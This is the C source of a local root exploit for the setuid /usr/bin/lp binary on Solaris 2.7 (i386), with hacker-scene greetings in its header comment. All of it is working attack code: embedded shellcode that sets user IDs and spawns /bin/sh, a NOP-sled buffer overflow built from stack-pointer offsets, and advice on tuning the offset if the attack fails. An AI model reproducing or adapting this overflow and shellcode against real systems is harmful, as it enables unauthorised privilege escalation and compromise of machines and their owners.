/*      
 *      
 * solaris 2.7 /usr/bin/lp local exploit, i386.
 *
 * discovered by DiGiT.
 * try offset 150-250 if sploit fails
 *
 * greets: #!ADM, #!security.is, #hax, duke
 *
 * DiGiT - teddi@linux.is 
 *
 */

#include <stdio.h>
#include <stdlib.h> 


char shellcode[] =
 "\xeb\x48\x9a\xff\xff\xff\xff\x07\xff\xc3\x5e\x31\xc0\x89\x46\xb4"
 "\x88\x46\xb9\x88\x46\x07\x89\x46\x0c\x31\xc0\x50\xb0\x8d\xe8\xdf"
 "\xff\xff\xff\x83\xc4\x04\x31\xc0\x50\xb0\x17\xe8\xd2\xff\xff\xff"
 "\x83\xc4\x04\x31\xc0\x50\x8d\x5e\x08\x53\x8d\x1e\x89\x5e\x08\x53"
 "\xb0\x3b\xe8\xbb\xff\xff\xff\x83\xc4\x0c\xe8\xbb\xff\xff\xff\x2f"
 "\x62\x69\x6e\x2f\x73\x68\xff\xff\xff\xff\xff\xff\xff\xff\xff";
  
#define BUFSIZE  1100  
 
long get_esp() { __asm__("movl %esp,%eax"); }
 
int main(int argc, char *argv[]) {
 
  char buff[BUFSIZE];
  int nopcount=501, offset=260;
  int i;

  if (argc > 1) offset = atoi(argv[1]);
  if (argc > 2) nopcount  = atoi(argv[2]);

        memset (buff, 0x90, BUFSIZE);
 
                for (i = nopcount; i < BUFSIZE - 4; i += 4)
                *(long *) &buff[i] = get_esp() + offset;
        memcpy (buff + (nopcount - strlen (shellcode)), shellcode, strlen
        (shellcode));
 
            memcpy (buff, ":", 1);
            printf("Addr = 0x%x\n", get_esp() + offset);
         execl("/usr/bin/lp", "lp", "-d", buff, "-p", "/tmp/ps_data",NULL);
}
